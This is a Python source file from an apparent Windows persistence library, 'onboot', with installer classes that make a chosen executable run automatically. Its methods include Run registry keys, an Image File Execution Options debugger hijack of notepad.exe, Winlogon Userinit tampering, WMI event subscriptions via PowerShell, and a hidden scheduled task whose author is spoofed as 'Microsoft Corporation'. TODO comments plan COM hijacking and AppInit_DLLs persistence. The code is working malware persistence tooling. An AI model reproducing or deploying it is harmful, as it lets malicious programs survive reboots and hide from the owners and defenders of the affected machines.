import winreg
from getpass import getuser
from pathlib import Path
from subprocess import check_output

from onboot import Installer, random_str


class StartMenuInstaller(Installer):
    autostart_directory = Path(f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

    def get_autostart_path(self):
        return self.autostart_directory.joinpath(f"{self.config.name}.bat")

    def install(self) -> bool:
        try:
            text = f'start "" {self.config.get_path()}'
            return self.get_autostart_path().write_text(text) == len(text)
        except (OSError, IOError, PermissionError, FileNotFoundError):
            return False

    def uninstall(self) -> bool:
        if self.get_autostart_path().is_file():
            self.get_autostart_path().unlink()
            return True
        return False


class HKCUInstaller(Installer):
    registry_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    registry = winreg.HKEY_CURRENT_USER

    def install(self) -> bool:
        k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(k, self.config.name, 0, winreg.REG_SZ, str(self.config.get_path()))
        winreg.CloseKey(k)
        return True

    def uninstall(self) -> bool:
        k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(k, self.config.name)
        winreg.CloseKey(k)
        return True

    def is_supported(self) -> bool:
        return True


class HKLMInstaller(HKCUInstaller):
    registry = winreg.HKEY_LOCAL_MACHINE

    def is_supported(self) -> bool:
        return self.is_root()


class IFEOInstaller(HKLMInstaller):
    registry_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
    target_executable = "notepad.exe"  # Common target for IFEO persistence

    def install(self) -> bool:
        try:
            # Create subkey for target executable
            subkey_path = f"{self.registry_key}\\{self.target_executable}"
            k = winreg.CreateKeyEx(self.registry, subkey_path, 0, winreg.KEY_ALL_ACCESS)
            # Set Debugger value to point to our executable
            winreg.SetValueEx(k, "Debugger", 0, winreg.REG_SZ, str(self.config.get_path()))
            winreg.CloseKey(k)
            return True
        except (OSError, PermissionError, FileNotFoundError):
            return False

    def uninstall(self) -> bool:
        try:
            # Remove the IFEO subkey for the target executable
            subkey_path = f"{self.registry_key}\\{self.target_executable}"
            winreg.DeleteKey(self.registry, subkey_path)
            return True
        except (OSError, PermissionError, FileNotFoundError, WindowsError):
            return False

    def is_supported(self) -> bool:
        return self.is_root()


class UserInitInstaller(HKLMInstaller):
    registry_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

    def install(self) -> bool:
        try:
            k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_READ | winreg.KEY_WRITE)
            current_value, _ = winreg.QueryValueEx(k, "Userinit")
            # Append our executable to the Userinit value (separated by comma)
            new_value = f"{current_value},{self.config.get_path()}"
            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, new_value)
            winreg.CloseKey(k)
            return True
        except (OSError, PermissionError, FileNotFoundError):
            return False

    def uninstall(self) -> bool:
        try:
            k = winreg.OpenKey(self.registry, self.registry_key, 0, winreg.KEY_READ | winreg.KEY_WRITE)
            current_value, _ = winreg.QueryValueEx(k, "Userinit")
            # Remove our executable from the Userinit value
            new_value = current_value.replace(f",{self.config.get_path()}", "")
            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, new_value)
            winreg.CloseKey(k)
            return True
        except (OSError, PermissionError, FileNotFoundError):
            return False

    def is_supported(self) -> bool:
        return self.is_root()


class WMICInstaller(Installer):
    def install(self) -> bool:
        try:
            # Generate unique names for WMI objects
            filter_name = f"{self.config.name}_Filter"
            consumer_name = f"{self.config.name}_Consumer"
            binding_name = f"{self.config.name}_Binding"
            
            # Create WMI Event Filter (triggers on system startup)
            filter_cmd = f'''powershell -Command "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{filter_name}'; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_PerfFormattedData_PerfOS_System\\" AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320'}}; exit 0"'''
            
            # Create WMI Event Consumer (executes our program)
            consumer_cmd = f'''powershell -Command "$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{consumer_name}'; CommandLineTemplate='{self.config.get_path()}'}}; exit 0"'''
            
            # Bind filter to consumer
            binding_cmd = f'''powershell -Command "$binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=[ref](Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name='{filter_name}'\\" ); Consumer=[ref](Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name='{consumer_name}'\\" )}}; exit 0"'''
            
            # Execute commands
            check_output(filter_cmd, shell=True)
            check_output(consumer_cmd, shell=True)
            check_output(binding_cmd, shell=True)
            return True
        except (OSError, PermissionError, FileNotFoundError):
            return False

    def uninstall(self) -> bool:
        try:
            filter_name = f"{self.config.name}_Filter"
            consumer_name = f"{self.config.name}_Consumer"
            
            # Remove binding (it will be automatically removed when filter or consumer is deleted)
            # Remove filter
            filter_cmd = f'''powershell -Command "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name='{filter_name}\\" | Remove-WmiObject; exit 0"'''
            
            # Remove consumer
            consumer_cmd = f'''powershell -Command "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name='{consumer_name}\\" | Remove-WmiObject; exit 0"'''
            
            check_output(filter_cmd, shell=True)
            check_output(consumer_cmd, shell=True)
            return True
        except (OSError, PermissionError, FileNotFoundError):
            return False

    def is_supported(self) -> bool:
        return self.is_root()


class SchTaskInstaller(Installer):
    def generate_task_xml(
            self,
            work_dir: Path = Path(""),
            author: str = "Microsoft Corporation",
            description: str = ""
    ):
        if work_dir == "":
            work_dir = self.config.get_path()
        return f'''
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>{author}</Author>
    <Description>{description}</Description>
    <URI>\\{self.config.name}</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>2</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.config.get_path()}</Command>
      <WorkingDirectory>{work_dir}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
'''

    def install(self) -> bool:
        try:
            text = self.generate_task_xml()
            fp = Path("%APPDATA%").joinpath(f"{random_str()}.xml")
            fp.write_text(text)
            check_output(f"cmd /C schtasks /create /xml {fp} /tn {self.config.name}", shell=True)
            fp.unlink()
            return True
        except (OSError, IOError, PermissionError, FileNotFoundError):
            return False

    def uninstall(self) -> bool:
        try:
            check_output(f'cmd /C schtasks /delete /tn "{self.config.name}"')
            return True
        except (OSError, IOError, PermissionError, FileNotFoundError):
            return False

    def is_supported(self) -> bool:
        return True


# TODO: Implement ServiceInstaller for Windows Service creation
# TODO: Implement GroupPolicyInstaller for Group Policy-based persistence
# TODO: Implement AppInitInstaller for AppInit_DLLs persistence
# TODO: Implement ScreensaverInstaller for screensaver-based persistence
# TODO: Implement COMHijackInstaller for COM object hijacking
# TODO: Implement ShellExtensionInstaller for shell extension persistence
# TODO: Implement BootExecuteInstaller for BootExecute registry key
# TODO: Implement PrintMonitorInstaller for print monitor persistence
